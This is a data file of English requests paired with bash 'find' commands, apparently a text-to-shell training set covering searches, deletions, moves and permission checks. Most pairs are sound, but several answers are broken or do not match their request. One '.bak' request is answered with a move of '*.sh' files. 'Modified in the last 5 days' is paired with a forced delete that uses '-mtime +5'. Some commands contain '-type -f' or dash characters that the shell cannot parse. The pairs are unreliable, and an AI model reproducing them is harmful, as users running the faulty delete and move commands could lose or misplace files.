{"input": "find all  *.csv files which  modify within last 2 days in /home directory then zip ( archive )-", "answer": "find /home/archive -type f -name \"*.csv\"  -mtime -2 -exec gzip -9f {} \\;"}
{"input": "find all  files that match \"[a-f0-9\\-]{36}\\.jpg\" of grep", "answer": "find . * | grep -P \"[a-f0-9\\-]{36}\\.jpg\""}
{"input": "find all \".flac\" files starting with \"cmn-\" and search for files having CJK characters using unicodes", "answer": "find . -name 'cmn-*.flac' -print | grep -P '[\\x4e00-\\x9fa5]'"}
{"input": "find all '*.c' files under $HOME directory which context contains sprintf", "answer": "find $HOME -name '*.c' -print | xargs grep -l sprintf"}
{"input": "find all 'js' suffix files  exclue the path *exclude/this/dir*' under current dirctory", "answer": "find . -name '*.js' -not -path '*exclude/this/dir*'"}
{"input": "find all .bak files in or below the current directory and move them to ~/.old.files directory:", "answer": "find . -name \"*.sh\" -print0 | xargs -0 -I {} mv {} ~/back.scripts"}
{"input": "find all .pm, .pl files in /users/tom and search for multiple pattern in same files and display the matched file names", "answer": "find /users/tom -name '*.p[lm]' -exec grep -l -- '->get(' {} + | xargs grep -l '#hyphenate'"}
{"input": "find all CSS files that do something with your HTML ID #content", "answer": "find . -name \"*.css\" -exec grep -l \"#content\" {} \\;"}
{"input": "find all CSS files under currenty directory and use sed to edit them", "answer": "find . -name \"*.css\" -exec sed -i -r 's/#(FF0000|F00)\\b/#0F0/' {} \\;"}
{"input": "find all PDFs owned by user 'seamstress'", "answer": "find / -user seamstress -iname '*.pdf'"}
{"input": "find all c, cpp files in current folder", "answer": "find -name \"*.cpp\" -o -name \"*.c\""}
{"input": "find all configuration files in a folder", "answer": "find /home/pat -iname \"*.conf\""}
{"input": "find all data files in current folder which have not been changed in the last 60 minutes and display their name without extension", "answer": "find . -iregex \"./[^/]+\\.dat\" -type f -cmin +60 -exec basename {} \\;"}
{"input": "find all directories in the current directory", "answer": "find . -type d -name \"*\""}
{"input": "find all directories in the current directory which have the name foo and do not have the extension \"bar\"", "answer": "find . -name '*foo*' ! -name '*.bar' -type d -print"}
{"input": "find all directories that names are 'apt' and display details", "answer": "find  / -type d -name \"apt\" -ls"}
{"input": "find all directories that names are 'project.images' and display details", "answer": "find  / -type d -name \"project.images\" -ls"}
{"input": "find all directories with the name \"lib64\" in the usr folder and replace space with ':'", "answer": "find /usr -name lib64 -type d|paste -s -d:"}
{"input": "find all directories with the name test in a directory", "answer": "find /home/john -type d -name test -print"}
{"input": "find all empty files in the current directory ( empty file = size 0 bytes )", "answer": "find . -size 0"}
{"input": "find all executable files", "answer": "find / -executable"}
{"input": "find all file name in curent directory ,  -exec will file all file output  awk used here for print only file name ", "answer": "find .  -type f  -exec ls -lrt {} \\; |awk -F' ' '{print $9}'"}
{"input": "find all files  that names are 'apt'", "answer": "find  / -name \"apt\""}
{"input": "find all files  that names are 'apt' and display detailed list", "answer": "find  / -name \"apt\" -ls"}
{"input": "find all files  the current folder which have not been accessed in the last 7 days and which are bigger than 20KB", "answer": "find . -atime +7 -size +20480 -print"}
{"input": "find all files & dircetiry in current directory which  have .tmp extension and delete them ", "answer": "find . -type f -name \"*.tmp\"  -exec rm -rf {} \\;"}
{"input": "find all files and directories under the current directory and display the inode of each one, using printf", "answer": "find . -printf \"%i \\n\""}
{"input": "find all files beneath the current directory that begin with the letters 'Foo' and delete them", "answer": "find . -type f -name \"Foo*\" -exec rm {} \\;"}
{"input": "find all files ending with \"js.compiled\" in current folder (print0 is used to handle files with newlines in their names)", "answer": "find ./js/ -name \"*.js.compiled\" -print0"}
{"input": "find all files ending with \"js.compiled\" in current folder and rename them", "answer": "find . -name \"*.js.compiled\" -exec rename -v 's/\\.compiled$//' {} +"}
{"input": "find all files having certain word in its name in the current folder", "answer": "find . -name \"*bsd*\" -print"}
{"input": "find all files in /usr/bin and run the \"file\" command on them", "answer": "find /usr/bin | xargs file"}
{"input": "find all files in and under the current directory that have read, write and execute permissions set for all users", "answer": "find . -perm 777 -print"}
{"input": "find all files in current folder having the name pattern \"some_pattern\" and move them to folder target_location (GNU VERSION)", "answer": "find . -name some_pattern -print0 | xargs -0 -I % mv % target_location"}
{"input": "find all files in current folder having the name pattern \"some_pattern\" and move them to the folder target_location (GNU VERSION)", "answer": "find . -name some_pattern -print0 | xargs -0 -i mv {} target_location"}
{"input": "find all files in current folder using name patterns", "answer": "find . -iregex \".*packet.*\""}
{"input": "find all files in current folder which are bigger than 1 MB and move them to another folder", "answer": "find . -size +1M -exec mv {} files \\+"}
{"input": "find all files in current folder which are bigger than 1 MB and move them to another folder after user confirmation", "answer": "find . -size +1M -ok mv {} files \\+"}
{"input": "find all files in current folder which are exactly 300MB", "answer": "find . -size 300M"}
{"input": "find all files in current folder which are more than 300MB", "answer": "find . -size +300M"}
{"input": "find all files in current folder which have been accessed exactly 10 minutes ago", "answer": "find . -amin 10"}
{"input": "find all files in etc which have been changed in the last 1 day", "answer": "find /etc -daystart -ctime -1"}
{"input": "find all files in etc which have been changed in the last 25 hours", "answer": "find /etc -ctime -1"}
{"input": "find all files in home folder which have been modified after a timestamp", "answer": "find ~ -newer /tmp/timestamp"}
{"input": "find all files in home folder which have been modified exactly 1 day before", "answer": "find ~ -mtime 1 -daystart"}
{"input": "find all files in the a direcotry which have been modified in exactly 1 day back", "answer": "find /home/bozo/projects -mtime 1"}
{"input": "find all files in the current directory and sub-directories that were accessed after modifying /etc/hosts", "answer": "find -anewer /etc/hosts"}
{"input": "find all files in the current directory do not display the files which are not readable", "answer": "find . ! -readable -prune"}
{"input": "find all files in the current directory do not display the files which do not have read permission to all users", "answer": "find . ! -perm -g+r,u+r,o+r -prune"}
{"input": "find all files in the current directory excluding those that end with .js or have the words .min or console in their name", "answer": "find . -type f \\( -name \"*.js\" ! -name \"*-min*\" ! -name \"*console*\" \\)"}
{"input": "find all files in the current directory that are less than 1 byte size", "answer": "find . -size -1c -print"}
{"input": "find all files in the current directory which are bigger than 4MB", "answer": "find . -size +4096k -print"}
{"input": "find all files in the current directory whose size is 24 or 25 bytes", "answer": "find . -size -26c -size +23c -print"}
{"input": "find all files in the current folder and search for a word in them", "answer": "find . -type f -exec grep \"applicationX\" {} \\;"}
{"input": "find all files in the current folder that are modified exactly 1 minute ago", "answer": "find -mmin 1 -print"}
{"input": "find all files in the current folder that are modified exactly 2 minutes ago", "answer": "find -mmin 2 -print"}
{"input": "find all files in the current folder that are not modified in the last 10 minutes", "answer": "find . -mmin +10 -print"}
{"input": "find all files in the current folder that are not modified in the last 240 hours", "answer": "find . -mtime +10 -print"}
{"input": "find all files in the current folder that end with \",txt\"", "answer": "find . -name \"*,txt\""}
{"input": "find all files in the current folder that have a single letter in their name and have not been modified today", "answer": "find . -name \\? -mtime +0"}
{"input": "find all files in the current folder which are bigger than 10MB and less than 50 MB", "answer": "find . -size +10M -size -50M -print"}
{"input": "find all files in the current folder which are of size 0 bytes", "answer": "find . -type f -size 0b"}
{"input": "find all files in the current folder which end with macs", "answer": "find -name '*macs'"}
{"input": "find all files in the current folder which have been accessed in the last 30 minutes", "answer": "find . -amin -30"}
{"input": "find all files in the current folder which have been modified after /etc/passwd", "answer": "find -newer /etc/passwd"}
{"input": "find all files in the current folder which have been modified in the last 24 hours", "answer": "find . -mtime -1 -print"}
{"input": "find all files in the current folder which have been modified in the last 24 hours and whose file name is of length 1", "answer": "find . -name \\? -mtime -1"}
{"input": "find all files in the current folder which have not been accessed in the last 30 days in the current folder", "answer": "find . -atime +30 -print"}
{"input": "find all files in the current folder which have not been accessed in the last 7 days or which are bigger than 20KB", "answer": "find . -atime +7 -o -size +20480 -print"}
{"input": "find all files in the current folder which have not been changed in the last 48 hours", "answer": "find ./ -daystart -ctime +2"}
{"input": "find all files in the current folder which have not been modified today and whose file name is of length 1", "answer": "find . -name \\? -mtime +0"}
{"input": "find all files in the current folder which have only the write permission for the others", "answer": "find . -perm -0002 -print"}
{"input": "find all files in the current folder which start with pro", "answer": "find . -name pro\\*"}
{"input": "find all files in the current folder whose size is less than 50KB", "answer": "find . -size -50k"}
{"input": "find all files in the entire file system whose size is more than 100MB", "answer": "find / -size +100M"}
{"input": "find all files in the file system having the name \"filename\"", "answer": "find / -iname \"filename\""}
{"input": "find all files in the file system which belong to the group users and having the word \"filename\" in their name", "answer": "find / -group users -iname \"filename\""}
{"input": "find all files in the file system which belong to the user pat and having the word \"filename\" in their name", "answer": "find / -user pat -iname \"filename\""}
{"input": "find all files in the file system which have been accessed in the last 24 hours", "answer": "find / -atime 0"}
{"input": "find all files in the file system which have no user and no group", "answer": "find / -nouser -nogroup"}
{"input": "find all files in the file system which have not been accessed in the last 2 days", "answer": "find / -atime +2"}
{"input": "find all files in the file system whose size is bigger than 3GB", "answer": "find / -size +3G"}
{"input": "find all files in the file system with the permissions 777 and having the word \"filename\" in their name", "answer": "find / -perm 777 -iname \"filename\""}
{"input": "find all files in the folder \"myfiles\" which are exactly 5 bytes", "answer": "find /myfiles -size 5"}
{"input": "find all files in the folder \"myfiles\" which have not been accessed in the last 30*24 hours", "answer": "find /myfiles -atime +30"}
{"input": "find all files in the folder /path/to/dir which have been modified between two dates", "answer": "find /path/to/dir -newermt yyyy-mm-dd ! -newermt yyyy-mm-dd -ls"}
{"input": "find all files in the home folder that are modified in the last 24 hours", "answer": "find $HOME -mtime -1"}
{"input": "find all files in the home folder that are modified in the last 7 days", "answer": "find $HOME -mtime -7"}
{"input": "find all files in the home folder which are modified in the last 2 days", "answer": "find ~ -type f -mtime -2"}
{"input": "find all files in the home folder which have been modified between 72 and 96 hours before", "answer": "find ~ -mtime 2 -mtime -4 -daystart"}
{"input": "find all files starting with capital letter in the current folder", "answer": "find . \u2014 name \"[A\u2011Z]*\" \u2014 print"}
{"input": "find all files that are readable and writable by their owner", "answer": "find . -perm -600 -print"}
{"input": "find all files that are readable or writable by their owner", "answer": "find . -perm +600 -print"}
{"input": "find all files that belong to root user", "answer": "find . -uid 0 -print"}
{"input": "find all files that do not have execute permission to all", "answer": "find . -type d ! -perm -111"}
{"input": "find all files that do not have read permission to all", "answer": "find . -type f ! -perm -444"}
{"input": "find all files that have been used more than two days since their status was last changed", "answer": "find -used +2"}
{"input": "find all files that names are dir-name-here", "answer": "find / -name \"dir-name-here\""}
{"input": "find all files that names are filename and open in nano text editor", "answer": "find / -name filename -exec  nano '{}' \\;"}
{"input": "find all files that names are game", "answer": "find / -name game"}
{"input": "find all files that were modified between 90 to 100 days ago in home directory and delete then ", "answer": "find /home -type f -mtime +90 -mtime -100  -exec rm  {} \\;"}
{"input": "find all files under \"/usr\"", "answer": "find /usr -print"}
{"input": "find all files under the /etc directory and display IP address patterns in them", "answer": "find /etc -type f -exec cat '{}' \\; | tr -c '.[:digit:]' '\\n' \\ | grep '^[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*\\.[^.][^.]*$'"}
{"input": "find all files under the /etc directory and display any IP address patterns in them", "answer": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;"}
{"input": "find all files under the current directory, filtering the output through a regular expression to find any lines that contain the word foo or bar", "answer": "find ./ | grep -E 'foo|bar'"}
{"input": "find all files under the current folder except dir1 dir2 dir3  folder", "answer": "find . -type d \\( -path dir1 -o -path dir2 -o -path dir3 \\) -prune -o -print"}
{"input": "find all files which name contain 'foo' and path is not dir1 or dir2", "answer": "find ! -path \"dir1\" ! -path \"dir2\" -name \"*foo*\""}
{"input": "find all files with pattern` '*.mp3'", "answer": "find / -name *.mp3"}
{"input": "find all files with pattern` '*.mp3' and send output into nameoffiletoprintto file", "answer": "find / -name *.mp3 -fprint nameoffiletoprintto"}
{"input": "find all files with pattern` '*song*abc2009*.jpg' and replace \"abc2009\" with \"def2010\"", "answer": "find . -name '*song*abc2009*.jpg' | sed 's/\\(^.*song.*\\)abc2009\\(.*.jpg\\)$/mv \"&\" \"\\1def2010\\2\"/' | sh"}
{"input": "find all files with the first letter 'e' or 'f' and last one x in /usr/bin directory:", "answer": "find /usr/bin -name [ef]*x"}
{"input": "find all files without 777 permision", "answer": "find / -type f ! perm 777"}
{"input": "find all foo.bar files in the entire file system", "answer": "find / -name foo.bar -print"}
{"input": "find all foo.bar files in the entire file system and which are present in the same partition as root", "answer": "find / -name foo.bar -print -xdev"}
{"input": "find all gif files in the file system", "answer": "find / -name \"*gif\" -print"}
{"input": "find all gzip files in a folder", "answer": "find /home/foo -name \"*.gz\""}
{"input": "find all hidden files in the current folder which have been modified after profile file", "answer": "find . -type f -name \".*\" -newer .cshrc -print"}
{"input": "find all html or cgi files in current folder", "answer": "find ./ -type f -iregex \".*\\.html$\" -or -iregex \".*\\.cgi$\""}
{"input": "find all java files in the current folder and search for the pattern REGEX", "answer": "find . -name '*.java' -exec grep REGEX {} \\;"}
{"input": "find all jpg files in current folder", "answer": "find . -type f -name \"*.JPG\""}
{"input": "find all jpg files in the folder which are in the path \"/201111/\" and sort them based on name", "answer": "find */201111/* -name \"*.jpg\" | sort -t '_' -nk2"}
{"input": "find all jpg,png,jpeg,pdf,tif,tiff,bmp and other image formats using regular expressions excluding those ending with \"_ocr.pdf\"", "answer": "find /somepath -type f -iregex \".*\\.(pdf\\|tif\\|tiff\\|png\\|jpg\\|jpeg\\|bmp\\|pcx\\|dcx)\" ! -name \"*_ocr.pdf\" -print0"}
{"input": "find all js files under the build direcotry except build/external and build/log directory", "answer": "find build -not \\( -path build/external -prune \\) -not \\( -path build/blog -prune \\) -name \\*.js"}
{"input": "find all js files under the build direcotry except build/external directory", "answer": "find build -not \\( -path build/external -prune \\) -name \\*.js"}
{"input": "find all js files which path does not contain ./node_modules/* nor './vendor/*\"", "answer": "find -name '*.js' -not -path './node_modules/*' -not -path './vendor/*'"}
{"input": "find all js files which path neither ./dir1 nor ./dir2", "answer": "find . -name '*.js' -not \\( -path \"./dir1\" -o -path \"./dir2/*\" \\)"}
{"input": "find all log files larger then 100MB  in /home directory and delete them ", "answer": "find /home -type f -name *.log -size +100M -exec rm -f {} \\;"}
{"input": "find all normal/regular files in current folder and display the total lines in them", "answer": "find . -type f -exec wc -l {} +"}
{"input": "find all normal/regular files in current folder and display them in sorted order", "answer": "find . -type f -ls | awk '{print $(NF-3), $(NF-2), $(NF-1), $NF}'"}
{"input": "find all normal/regular files in current folder and replace a word in all these files", "answer": "find . -type f -print0 | xargs -0 sed -i '' 's/2013/2012/g'"}
{"input": "find all normal/regular files in current folder which end with \"~\" or which begin and end with \"#\" and and and delete them", "answer": "find . -maxdepth 1 -type f -name '*~' -delete  -or -name '#*#' -delete"}
{"input": "find all normal/regular files in current folder which end with \"~\" or which begin and end with \"#\" and and move them to  temp folder", "answer": "find . -maxdepth 1 -type f  -name '*~' -exec mv {} /tmp/ \\;  -or  -name '#*#' -exec mv {} /tmp/ \\;"}
{"input": "find all normal/regular files in the current directory", "answer": "find . -type f -print"}
{"input": "find all of the executable files on your computer", "answer": "find / -executable"}
{"input": "find all of the files that are readable", "answer": "find / -readable"}
{"input": "find all pdf files in the current folder", "answer": "find . -name '*.pdf' -print"}
{"input": "find all php files in the folder  /var/www/", "answer": "find /var/www/ -type f -iname \"*.php\" -print"}
{"input": "find all png files in the current folder", "answer": "find . -type f -name '*.png'"}
{"input": "find all posix-extended regex  \"[a-f0-9\\-]\\{36\\}\\.jpg\" files", "answer": "find . -regextype posix-extended -regex \"[a-f0-9\\-]\\{36\\}\\.jpg\""}
{"input": "find all raw images in the current folder and pass them one at a time to the xargs command and enable parallel processing of the files", "answer": "find . -type f -iname '*.CR2' -print0 | xargs -0 -n 1 -P 8 -I {}"}
{"input": "find all read me files in a folder", "answer": "find /usr/share/doc -name README"}
{"input": "find all readable files", "answer": "find / -readable"}
{"input": "find all readme files in a folder", "answer": "find /usr/share/doc -name README"}
{"input": "find all regex  \".*/[a-f0-9\\-]\\{36\\}\\.jpg\" files", "answer": "find . -regextype sed -regex \".*/[a-f0-9\\-]\\{36\\}\\.jpg\""}
{"input": "find all regex  '\\./[a-f0-9\\-]\\{36\\}\\.jpg' files", "answer": "find . -regex '\\./[a-f0-9\\-]\\{36\\}\\.jpg'"}
{"input": "find all regex \"./[a-f0-9\\-]\\{36\\}\\.jpg\" files", "answer": "find . -regex \"./[a-f0-9\\-]\\{36\\}\\.jpg\""}
{"input": "find all regular file and create jw-htmlfiles.tar", "answer": "find . -type f -name \"*html\" | xargs tar cvf jw-htmlfiles.tar -"}
{"input": "find all regular files  then display the number of occurrences of banana without lines not proper end", "answer": "find . -type f -print0| xargs -0 grep -c banana| grep -v \":0$\""}
{"input": "find all regular files exclude .o and exclude *.swp and output line number of soc_attach if it has", "answer": "find .  \\( ! -path \"./output/*\" \\) -a \\( -type f \\) -a \\( ! -name '*.o' \\) -a \\( ! -name '*.swp' \\) | xargs grep -n soc_attach"}
{"input": "find all regular files in current directory and replace the word searc to replace in them", "answer": "find . -type f -exec sed -i 's/searc/replace/g' {} \\;"}
{"input": "find all regular/normal files in current folder which have been modified in the last 60 minutes", "answer": "find -type f -mtime -60"}
{"input": "find all regular/normal files in the current folder", "answer": "find -type f"}
{"input": "find all regular/normal files in the current folder that have been modified in the last 120 hours", "answer": "find -mtime -5 -type f -print"}
{"input": "find all regular/normal files in the current folder whose name has the word photo or picture and which have been modified in the last 30 minutes", "answer": "find . \\( -iname \"*photo*\" -or -name \"*picture*\" \\) -and ! -type d -and -mmin -30"}
{"input": "find all regular/normal files in the folder \"myfiles\" which have read and write permission to the other users", "answer": "find /myfiles -type f -perm -o+rw"}
{"input": "find all regular/normal files which have execute permission in current folder and copy them to another folder", "answer": "cp `find -perm -111 -type f` /usr/local/bin"}
{"input": "find all sqlite files in the current directory", "answer": "find ./ -name \"*.sqlite\""}
{"input": "find all symbolic links in the current folder", "answer": "find -type l"}
{"input": "find all teh script files in a directory", "answer": "find /home/john -name \"*.sh\" -type f -print"}
{"input": "find all text files in current folder and delete all the files that have the word foo in their name", "answer": "find . -name \".txt\" | grep \"foo\" | xargs rm"}
{"input": "find all text files in current folder and delete them", "answer": "find . -name \".txt\" -exec rm \"{}\" \\;"}
{"input": "find all text files in current folder and display all files that have the alphabet a in their name", "answer": "find . -name \".txt\" | grep a"}
{"input": "find all text files in current folder and trim the extra spaces in all lines in these files", "answer": "find . -type f -name '*.txt' -exec sed --in-place 's/[[:space:]]\\+$//' {} \\+"}
{"input": "find all text files in current folder and trim the extra spaces in all lines in these files ( MAC version )", "answer": "find . -iname '*.txt' -type f -exec sed -i '' 's/[[:space:]]\\{1,\\}$//' {} \\+"}
{"input": "find all text files in current folder; which have been modified exactly 5 days ago", "answer": "find . \u2013name \"*.txt\" \u2013mtime 5"}
{"input": "find all text files in the current directory", "answer": "find . -name \"*.txt\" -print"}
{"input": "find all text files in the current directory and compress them to a cpio file", "answer": "find . -name '*.txt' | cpio -pdm /path/to/destdir"}
{"input": "find all text files in the current directory and display them page wise", "answer": "find . -name \"*.txt\" -print"}
{"input": "find all text files in the current folder", "answer": "find -name \"*.txt\""}
{"input": "find all text files in the current folder excluding those that are presenti n the folder \"/svn\" and search for a pattern", "answer": "find . -name '*.txt' \\! -wholename '*/.svn/*' -exec grep 'sometext' '{}' \\; -print"}
{"input": "find all text files in the current folder which have been modified after the file /tmp/newerthan", "answer": "find . -name \"*.txt\" -newer /tmp/newerthan"}
{"input": "find all text files in the folder \"FFF\" and find the md5sum for them", "answer": "find FFF -name \"*.txt\" -exec md5sum '{}' \\;"}
{"input": "find all text files in user/directory/ and display the last line", "answer": "find /user/directory/* -name \"*txt\" -mtime 0   -type f -exec awk '{s=$0};END{print FILENAME, \": \",s}' {} \\;"}
{"input": "find all text files in user/directory/ which have been modified today and display the last line of these files", "answer": "find /user/directory/ -name \"*txt\" -mtime 0 -type f -printf '%p: ' -exec tail -1 {} \\;"}
{"input": "find all text files which have extra extensions in the current folder", "answer": "find . -name '*.text' -exec $SHELL -c '[ ! -f ${1%.*} ]' $SHELL '{}' ';' -print"}
{"input": "find all the \".JPG\" files in current folder and display their count", "answer": "find ./ -name '*.JPG' -type f | wc -l"}
{"input": "find all the \".c\" files in the folder \"/home/you\" which have been accessed in the last 30*24 hours", "answer": "find /home/you -iname \"*.c\" -atime -30 -type -f"}
{"input": "find all the \".jpg\" files in current folder and display their count", "answer": "find ./ -name '*.jpg' -type f | wc -l"}
{"input": "find all the \".wma\" files in the folder \"$current_directory\"", "answer": "find \"${current_directory}\" -type f -iname \"*.wma\""}
{"input": "find all the \"error_log\" files in the folder \"/home\" which are bigger than 5MB and force delete them", "answer": "find /home -size +5000000b -name \"error_log\" -exec rm -rf {} \\;"}
{"input": "find all the \"jpg\" file in a folder", "answer": "find /win/C -iname *JPG"}
{"input": "find all the \"passwd\" files in the entire file system", "answer": "find / -iname passwd"}
{"input": "find all the .jpg files in / and copy them to the current folder", "answer": "find / -type f -name *.jpg  -exec cp {} . \\;"}
{"input": "find all the backup files in the current folder and delete them", "answer": "find . -type f -name \"*.bak\" -exec rm -f {} \\;"}
{"input": "find all the backup files in the current folder and delete them after user confirmation", "answer": "find . -type f -name \"*.bak\" -exec rm -i {} \\;"}
{"input": "find all the configuration files in /etc folder along with the last access & modification time", "answer": "find /etc -name \"*.conf\" -printf \"%f %a, %t\\n\""}
{"input": "find all the configuration files in the file system", "answer": "find / -name \"*.conf\""}
{"input": "find all the configuration files which have been accessed in the last 30 minutes", "answer": "find /etc/sysconfig -amin -30"}
{"input": "find all the configuration or text files in current directory", "answer": "find . -type f \\( -name \"*.conf\" -or -name \"*.txt\" \\) -print"}
{"input": "find all the core files in the entire file system and  delete them", "answer": "find / -name core -exec rm -f {} \\;"}
{"input": "find all the core files in the temp folder and force delete them", "answer": "find /tmp -name core -type f -print | xargs /bin/rm -f"}
{"input": "find all the cpp files in current folder", "answer": "find -name \"*.cpp\""}
{"input": "find all the cpp files in the current folder", "answer": "find . -iname '*.cpp' -print"}
{"input": "find all the cpp files in the current folder and move them to another folder", "answer": "find . -type f -iname '*.cpp' -exec mv {} ./test/ \\;"}
{"input": "find all the cpp files in the current folder and move them to another folder(plus takes the bulk output of the find command and gives it as input to the move command in exec)", "answer": "find . -type f -iname '*.cpp' -exec mv -t ./test/ {} \\+"}
{"input": "find all the cpp(C++ source files), java, header files in the current directory", "answer": "find . -name *.cpp -o -name *.h -o -name *.java"}
{"input": "find all the css files", "answer": "find -name '*.css'"}
{"input": "find all the database files in the folder /var/named", "answer": "find /var/named -type f -name *.db"}
{"input": "find all the directories  with the name \"c\" in the current folder which are at least 3 levels deep and which are not present in the path \"/p/\"", "answer": "find -mindepth 3 -type d ! -path '*/p/*' -name c -print"}
{"input": "find all the directories in current folder and delete them", "answer": "find . -type d -delete"}
{"input": "find all the directories in current folder and do not search in sub directories", "answer": "find . -maxdepth 1 -type d -print0"}
{"input": "find all the directories in current folder which start with test", "answer": "find . -type d -name \"test*\""}
{"input": "find all the directories in the $LOGDIR folder which have been modified in the last 24 hours and compress them", "answer": "find $LOGDIR -type d -mtime +0 -exec compress -r {} \\;"}
{"input": "find all the directories in the current directory which dont have the execute permission", "answer": "find -type d ! -perm -111"}
{"input": "find all the directories in the current folder", "answer": "find . -type d -print"}
{"input": "find all the directories in the current folder and create the same directory structure in a remote machine using ssh", "answer": "find -type d | ssh server-B 'xargs -I% mkdir -p \"/path/to/dir/%\"'"}
{"input": "find all the directories in the current folder and replace the", "answer": "find -type d|sed -r '/^.$/{s:.:#!/bin/bash:};{s/^\\./mkdir -p &/}'"}
{"input": "find all the directories in the current folder excluding search in the sub directories and create these directories in another path", "answer": "find . -maxdepth 1 -type d | xargs -I X mkdir '/new/directory/X'"}
{"input": "find all the directories in the current folder which begin with the words \"kt\" and end with a digit", "answer": "find . -regex './kt[0-9] '"}
{"input": "find all the directories in the current folder which have been modified in 24 hours and move them to the folder  /path/to/target-dir", "answer": "find . -depth -type d -mtime 0 -exec mv -t /path/to/target-dir {} +"}
{"input": "find all the directories in the different folders excluding search in the sub directories and create these folders in the current directory", "answer": "find /media/New\\ Volume/bhajans -maxdepth 1 -type d | xargs -0 mkdir -p"}
{"input": "find all the directories in the entire file system whose size is greater than 50KB", "answer": "find / -type d -size +50k"}
{"input": "find all the directories in the file system which begin with \"man\"", "answer": "find / -type d -name 'man*' -print"}
{"input": "find all the directories in the file system which have read, write and execute to all the users", "answer": "find / \\( -type d -a -perm -777 \\) -print"}
{"input": "find all the directories in the folder $LOGDIR which have been modified in the last 5 days and delete them", "answer": "find $LOGDIR -type d -mtime +5 -exec rm -f {} \\;"}
{"input": "find all the directories in the folder /raid with the extension local_sd_customize", "answer": "find /raid -type d -name \".local_sd_customize\" -print"}
{"input": "find all the directories starting with the name \"someNamePrefix\" which have not been modified in the last 10 days and force delete them", "answer": "find /somePath -type d -name 'someNamePrefix*' -mtime +10 -print | xargs rm -rf ;"}
{"input": "find all the directories with the name \"some-dir\" in the current folder and move them to another folder and do not search in subfolders", "answer": "find ./ -maxdepth 1 -name \"some-dir\" -type d -print0 | xargs -0r mv -t x/"}
{"input": "find all the empty directories in current folder and delete them", "answer": "find ./ -empty -type d -delete"}
{"input": "find all the empty in the current folder do not search in sub directories", "answer": "find . -maxdepth 1 -type d -empty"}
{"input": "find all the error, access, ssl_engine and rewrite logs which are bigger than 300MB and are less then 5GB in the folder /opt", "answer": "find /opt \\( -name error_log -o -name 'access_log' -o -name 'ssl_engine_log' -o -name 'rewrite_log' -o  -name 'catalina.out' \\) -size +300000k -a -size -5000000k"}
{"input": "find all the file that have been modified exactly 3 days ago ( considers day starting not 24 hours )", "answer": "find ./ -daystart -mtime -3"}
{"input": "find all the file that have been modified in the last 3 days ( considers day starting not 24 hours )", "answer": "find ./ -daystart -mtime -3"}
{"input": "find all the file that have not been modified in the last 3 days ( considers day starting not 24 hours )", "answer": "find ./ -daystart -mtime +3"}
{"input": "find all the file which name (name can contains space) end with c or h and content contain 'thing'", "answer": "find . -name '*.[ch]' -print0 | xargs -r -0 grep -l thing"}
{"input": "find all the file which name end with c or h and content contain 'thing'", "answer": "find . -name '*.[ch]' | xargs grep -l thing"}
{"input": "find all the files  in the folder /opt which have been changed in the last 120 minutes", "answer": "find /opt -cmin -120"}
{"input": "find all the files (under root file system /) that were changed within the last 24 hours", "answer": "find / -ctime -1"}
{"input": "find all the files (under root file system /) that were updated in the last 24 hours", "answer": "find / -mtime -1"}
{"input": "find all the files and folder that were created in 2012 on Friday of every month", "answer": "find / -daystart -mtime +41 -mtime -408 \\   -printf \"%M %n %u %g %10s %TY-%Tm-%Td %Ta %TH:%TM:%TS %h/%f\\n\" | awk '($7==\"Fri\"){print}'"}
{"input": "find all the files ending with \".coffee\" in the current folder and search for the first occurence of the word \"re\" in each line", "answer": "find . -name '*.coffee' -exec awk '/re/ {print;exit}' {} \\;"}
{"input": "find all the files ending with \".coffee\" in the current folder and search for the words \"re\" in each line", "answer": "find . -name \\*.coffee -exec grep -m1 -i 're' {} \\;"}
{"input": "find all the files ending with \".foo\" in the folder /usr", "answer": "find /usr -name '*.foo' -print"}
{"input": "find all the files ending with \"clj\" in the current folder and search for a pattern", "answer": "find . -name '*.clj' -exec grep -r resources {} \\;"}
{"input": "find all the files ending with \"mkv\" in current folder", "answer": "find -name \"*.mkv\""}
{"input": "find all the files ending with \"rb\" and display the first 10000 lines from these files", "answer": "find . -name \"*rb\" -print0 | xargs -0 head -10000"}
{"input": "find all the files ending with \"~\" in current folder and move them to temp folder", "answer": "find -name '*~' -print0 | xargs -0 -I _ mv _ /tmp/"}
{"input": "find all the files ending with .mp3 or .jpg", "answer": "find . \\( -name '*.mp3' -o -name '*.jpg' \\) -print"}
{"input": "find all the files ending with jpg in current folder and display their count ( case insensitive )", "answer": "find ./ -iname '*.jpg' -type f | wc -l"}
{"input": "find all the files from root folder which have nogroup or noname and dispaly their details", "answer": "find / \\( -nogroup -o -noname \\) -ls"}
{"input": "find all the files in current directory of size exactly 6MB", "answer": "find . -size 6M"}
{"input": "find all the files in current directory of size greater than 10MB and less than 20 MB", "answer": "find . -size +10M -size -20M"}
{"input": "find all the files in current directory of size smaller than 10KB", "answer": "find . -size -10k"}
{"input": "find all the files in current folder ending with \"ini\" and search for a word in all these files", "answer": "find . -name *.ini -exec grep -w PROJECT_A {} \\; -print | grep ini"}
{"input": "find all the files in current folder which end with a speicifc regular expression and display their count", "answer": "find ./ -type f -regex \".*\\.[JPGjpg]$\" | wc -l"}
{"input": "find all the files in home folder which have been modified in the last 24 hours", "answer": "find $HOME -mtime -1"}
{"input": "find all the files in the /usr folder that have been modified after the file /usr/FirstFile", "answer": "find /usr -newer /usr/FirstFile -print"}
{"input": "find all the files in the /usr folder which have modification date less than or equal to the file \"/FirstFile\"", "answer": "find /usr ! -newer /FirstFile -print"}
{"input": "find all the files in the current directory and change the permissions to 775", "answer": "find . -exec chmod 775 {} \\;"}
{"input": "find all the files in the current directory and display them", "answer": "find . -exec echo {} ;"}
{"input": "find all the files in the current directory and search for the word \"pw0\" in them", "answer": "find . -exec grep -i \"pw0\" {} \\;"}
{"input": "find all the files in the current directory and sub-directories whose status was changed after /etc/fstab was modified", "answer": "find -cnewer /etc/fstab"}
{"input": "find all the files in the current directory and sub-directories, that were edited within the last 1 hour and execute the list command with long listing format", "answer": "find -mmin -60 -exec ls -l {} \\;"}
{"input": "find all the files in the current directory ending with \".i\"", "answer": "find . -name \".*\\.i\""}
{"input": "find all the files in the current directory that have the extension \"bar\" and donot search in the subdirecotries directories", "answer": "find . -name *.bar -maxdepth 2 -print"}
{"input": "find all the files in the current directory that have the word \"lib\" in them", "answer": "find . -wholename '/lib*'"}
{"input": "find all the files in the current directory which are bigger than 1000MB", "answer": "find . -size +1000M"}
